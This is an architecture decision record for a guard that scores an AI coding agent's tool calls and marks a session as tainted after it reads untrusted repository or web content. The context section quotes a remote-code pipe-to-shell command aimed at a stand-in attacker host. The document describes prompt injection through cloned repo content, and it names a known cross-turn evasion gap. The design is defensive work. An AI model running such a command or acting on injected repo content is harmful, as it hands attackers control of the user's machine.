# ADR-004: Origin Provenance — Session-Scoped Taint Tracking

**Date:** 2026-07-11
**Status:** Accepted
**Author:** Xing @ XingAI
**Also available:** [中文](004-origin-provenance-tracking.zh.md)

## Context

`untrusted_origin_instruction` (ADR-002, weight 20) is defined as "call arguments traced to freshly cloned repo content," but nothing computes it. `pretooluse-hook.sh` never sends an `origin` field — only the unit tests pass it manually. In real usage, the 0din-class attack (`curl evil.com/install.sh | sh` to an unknown host) only accumulates `shell_pipe_from_network(40) + network_unknown_host(20) = 60`, landing in `review`, not the higher score the README's demo description implies. The gap: the engine has no way to know *why* the agent decided to make a call — the user asked for it directly, or the agent "decided" after reading untrusted content.

## Decision

**No per-call provenance (tracing which specific string in which specific file drove a call's arguments). Instead, session-scoped taint tracking, bounded by the Claude Code turn rather than an arbitrary time or call-count window.**

Mechanism:

1. **Two new hook types**, alongside the existing `PreToolUse` (ADR-001):
   - `SessionStart` — if `cwd` is a git repo, snapshot `git ls-files` (resolved to absolute paths) as the **trusted baseline** for that session; `POST /session/init {session_id, cwd, tracked_paths}`. Non-git `cwd` → empty baseline (see rule below).
   - `PostToolUse` (new matcher: `Read`, `Grep`, `Glob`, `WebFetch`, `WebSearch`) — after each content read, `POST /taint {session_id, tool_name, source}`. The engine, not the hook, decides whether it's untrusted.
   - `UserPromptSubmit` (new) — `POST /taint/clear {session_id}` at the start of every new user turn.

2. **Untrusted classification (deterministic, in `policies/default.yaml`, not an LLM call):**
   - `WebFetch` / `WebSearch` results: **always** untrusted — external content has no baseline to compare against.
   - `Read` / `Grep` / `Glob` targets: untrusted if the session has a baseline and the resolved path is **not** in it (new/freshly-cloned file); trusted if it is in the baseline.
   - No baseline (non-git `cwd`): file reads never taint. This is an honest capability boundary, not a hidden gap — it means the primary 0din vector (malicious repo content) is undetectable outside git projects at v1, but `WebFetch`/`WebSearch` coverage still applies.

3. **Taint scope = the current turn.** A taint event is active from the `PostToolUse` call until the next `UserPromptSubmit` for that session — this covers the actual 0din attack shape (read untrusted content, then act on it within the same uninterrupted agent turn, whether that's the very next tool call or the twentieth). A hard safety-net TTL (`taint_ttl_seconds`, default 1800s) guards against a missed `UserPromptSubmit` leaving taint stuck forever.

4. **Engine change:** `/check` now derives `origin` by querying `session_tainted(session_id)` instead of trusting a caller-supplied field — provenance logic lives in one place (the engine), `pretooluse-hook.sh` stays unchanged and thin. `CheckRequest.origin` remains as a manual override for direct API testing, but the real hook path never needs to set it.

5. **Manual override:** `cli.py clear-taint <session_id>` clears a session's taint by hand, mirroring the existing approval-override ergonomics (ADR-003).

New tables: `session_baseline(session_id, path)`, `session_taint(session_id, source, tool_name, created_at, cleared_at)`.

## Consequences

Positive:
- The demo the README already promises becomes true: 0din-class corpus now actually fires `untrusted_origin_instruction`, crossing the `deny_at` threshold, instead of stalling at `review`.
- Classification stays deterministic and testable — same continuity as ADR-002's stance against LLM verdicts.
- No change to the `/check` request contract or the thin `pretooluse-hook.sh` — `origin` moves from "caller must supply" to "engine derives," which is strictly additive.

Tradeoffs:
- Three new hooks, two new tables, two new endpoints — real scope beyond the original week-1 milestone (~3-5 days).
- Non-git projects get no file-level provenance protection, only the always-untrusted `WebFetch`/`WebSearch` rule. Documented limitation, not silent.
- The "taint clears at the next `UserPromptSubmit`" boundary is confirmed against the [official hooks reference](https://code.claude.com/docs/en/hooks.md): `UserPromptSubmit` fires exactly once per human-submitted message, reliably, even across many tool calls in between — not an assumption, verified 2026-07-11.

Risks:
- A delayed attack that survives past the current turn (agent reads tainted content, does nothing suspicious this turn, acts on it two turns later) would not be caught. Mitigation: migration trigger below.
- `SessionStart` fires on `startup`, `resume`, `clear`, and `compact` (confirmed) — the adapter re-snapshots the baseline on all four, which is safe (idempotent) even though only `startup`/`resume` strictly need it. If a future harness version drops one of these sources, the baseline is simply missing for that session and file reads default to "no baseline" (untainted), same as non-git projects — narrows coverage, never widens the denial surface (fail-open on the provenance signal only, not on the other six signals).

## Alternatives Considered

| Option | Reason rejected |
|---|---|
| Exact per-call provenance (dataflow tracing from file content to call arguments) | Claude Code hooks don't expose that granularity; would require instrumenting the model's reasoning, not the tool boundary — over-engineered for what's detectable today |
| Fixed time window (e.g. "tainted if untrusted content was read in the last 5 minutes") | Arbitrary number, doesn't match either the immediate-execution attack shape or long-turn agentic loops |
| Fixed call-count window (e.g. "last 3 tool calls") | Same arbitrariness; a long turn with many benign calls would push the tainting read out of the window before the malicious call happens |
| Whole-session taint (once tainted, tainted until session ends) | False-positive accumulation makes the product unusable — one web fetch early in a session would flag every subsequent `git commit` for hours |

## Migration Triggers

- Real-world evidence of cross-turn delayed attacks (tainted content acted on after an intervening `UserPromptSubmit`) → revisit the turn boundary; likely needs an N-turn decay instead of a hard clear.
- Second harness support (ADR-001 phase 2, e.g. Cursor) → each harness's `SessionStart`/`UserPromptSubmit`/`PostToolUse` equivalents need their own adapter; provenance logic in the engine is unchanged.

## Related

- [ADR-001: Interception Point](001-interception-point.md)
- [ADR-002: Risk Scoring Model](002-risk-scoring-model.md)
- [ADR-003: Approval Workflow + Decision Ledger Reuse](003-approval-workflow-ledger.md)
